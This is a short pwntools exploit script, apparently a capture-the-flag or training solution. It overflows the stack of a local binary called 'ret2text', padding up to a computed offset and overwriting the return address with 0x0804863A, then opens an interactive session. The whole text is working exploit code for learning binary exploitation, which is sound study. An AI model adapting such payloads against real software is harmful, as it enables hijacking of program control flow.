from pwn import *

sh = process('./ret2text')

addr = 0x0804863A

eax = 0xffffd24c
ebp = 0xffffd2b8
offset = int(ebp-eax+4)

payload = b'a' *offset + p32(addr)

sh.sendline(payload)
sh.interactive()

